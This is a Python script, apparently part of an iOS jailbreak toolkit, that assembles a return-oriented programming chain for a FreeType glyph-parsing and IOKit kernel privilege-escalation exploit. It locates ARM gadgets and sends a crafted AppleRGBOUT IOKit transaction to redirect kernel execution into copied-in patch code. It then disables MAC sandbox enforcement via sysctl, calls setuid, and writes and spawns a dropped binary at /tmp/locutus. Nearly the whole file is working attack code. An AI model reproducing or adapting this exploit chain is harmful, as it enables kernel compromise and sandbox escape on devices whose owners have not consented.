#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib, os
import dmini
from world1 import *
import goo
import cPickle as pickle

MAP_ANON = 0x1000
MAP_SHARED = 0x0001

O_WRONLY = 0x0001
O_CREAT  = 0x0200
O_TRUNC  = 0x0400

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

four_dot_three = '4.3' in os.environ['VERSION']

if len(sys.argv) != 5:
    print >> sys.stderr, "usage: python catalog.py dejavu|two cache kern patchfile"
    sys.exit(1)

mode, cachefile, kernfile, patchfile = sys.argv[1:]
assert mode in ['dejavu', 'two']
patchfp = open(patchfile)

lib_paths = set(['/usr/lib/libSystem.B.dylib'])
def add_lib(short, path):
    dmini.cur.add_lib(short, path)
    lib_paths.add(path)

def dbg_result():
    if True:
        result, resultp = stackunkpair()
        store_r0_to(resultp)
        back = sys._getframe().f_back
        funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)

dmini.init(cachefile, True)

dmini.init(kernfile, False)

code_addr = 0x80000400 # XXX
weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-4]
count = 0
stuff = ''
while True:
    namelen = patchfp.read(4)
    if namelen == '': break
    name = patchfp.read(struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', patchfp.read(4))
    data = patchfp.read(struct.unpack('I', patchfp.read(4))[0])
    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
        continue
    stuff += I(addr, len(data)) + data
    count += 1
weirdfile = pointed(weirdfile + I(count) + stuff)

def mov_r3_r7():
    # push {r1, r3, r6, r7, lr}
    # pop  {r0, r1, r2, r3, r5, r7, pc}
    set_fwd('PC', dmini.cur.find_basic('+ ca b5 af bd'))
    exhaust_fwd('R0', 'R1', 'R2', 'R3', 'R5', 'R6', 'R7', 'LR')
    heapadd(fwd('R7'), fwd('PC'))


# not anymore   e89bb951	ldm	fp, {r0, r4, r6, r8, fp, ip, sp, pc}
#   e89bed06 	ldm	fp, {r1, r2, r8, sl, fp, sp, lr, pc}
kernel_ldm = dmini.cur.find_basic('- 06 ed 9b e8')
init('R1', 'R2', 'R8', 'R10', 'R11', 'SP', 'LR', 'PC')
m = pointed('')
set_fwd('SP', pointer(m))
heapadd(m)
mov_r3_r7()
funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
funcall('_flush_dcache', code_addr, len(weirdfile), 0)
set_fwd('PC', code_addr)

kstuff = finalize(None, must_be_simple=False)
assert len(kstuff) == 0x68

dmini.init(cachefile, True)

add_lib('ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
add_lib('iosurface', '/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface')
add_lib('iokit', '/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
add_lib('libz', '/usr/lib/libz.dylib')

if four_dot_three:
    def wrap(num):
        if (num & 0xf0000000) == 0x30000000:
            return reloc(3, num, alignment=0x1000)
        else:
            return num
    dmini.cur.wrap = wrap

if mode == 'dejavu':
    init('R4', 'R5', 'PC')
    make_r7_avail()
    set_sp_to_sp()
else:
    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
make_avail()

if mode == 'dejavu':
    load_r0_from(reloc(0xe, 0x558))
    load_r0_r0()
    zlocutusp, zlocutuspp = stackunkpair()
    store_r0_to(zlocutuspp)

funcall('_mach_task_self')
task_self, task_self_p = stackunkpair()
store_r0_to(task_self_p)

kstuffp = ptr(kstuff)

transaction = '\xee' * 8 + I(kstuffp) + '\xee' * (0x58 - 0xc) + I(kernel_ldm) + '\xee' * (0xd8 - 0x5c)

# The manpage says this returns EINVAL, but in fact the kernel handles it.
funcall('_mlock', kstuffp, len(kstuff)); dbg_result()

zerop = ptrI(0)

if mode == 'two':
    # XXX is this necessary? it's from star
    funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))

funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
matching, matchingp = stackunkpair()
store_r0_to(matchingp)
funcall('iokit._IOServiceGetMatchingService', 0, matching)
connect = ptrI(0)
funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()

funcall('iokit._IOConnectCallStructMethod', connect, 5, ptr(transaction), len(transaction), 0, 0, load_r0=True)
dbg_result(); funcall('_abort')


# do some housekeeping
# (but don't bother if we're going to exec)
if mode == 'dejavu':
    funcall('iokit._IOServiceClose', connect, load_r0=True)
    funcall('_munlock', kstuffp, len(kstuff)); dbg_result()

    # the boring stuff

    funcall('_malloc', reloc(0xa, 0))
    locutusp, locutuspp = stackunkpair()
    store_r0_to(locutuspp)
    funcall('libz._uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0)); dbg_result()
    locutus_str = ptr('/tmp/locutus', True)
    funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
    fd, fdp = stackunkpair()
    store_r0_to(fdp)
    #dbg_result()
    funcall('_write', None, locutusp, reloc(0xb, 0))
    dbg_result()
    funcall('_close', fd)
    dbg_result()
    funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
    dbg_result()

funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
dbg_result()

if mode == 'dejavu':
    funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
    dbg_result()
    funcall('_geteuid')
    funcall('_setuid', None); dbg_result()

    #funcall('_printf', ptr('done with shellcode\n', True))

    set_r0_to(1337)
    fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
else:
    quote = '(You got blood on my suit.)'
    funcall('_write', 2, ptr(quote), len(quote))
    lunchd = ptr('/sbin/lunchd', True)
    funcall('_execl', lunchd, lunchd, 0)

goo.sheap.append(weirdfile)

if mode == 'dejavu':
    final = finalize(reloc(0xd, 0))


    # add sp, #400; pop {r4, r5, pc}
    parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
    actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value

    final = final.unpack()

    open('dejavu.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final}))
else:
    # for two.py
    initializer = dmini.cur.find_basic('+ 5f 13 77 47') # asrs r7, r3, #13; bx lr
    init_sp = 0x10031000
    address = 0x8000

    final = finalize(address)
    #heapdump(final)
    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths}))
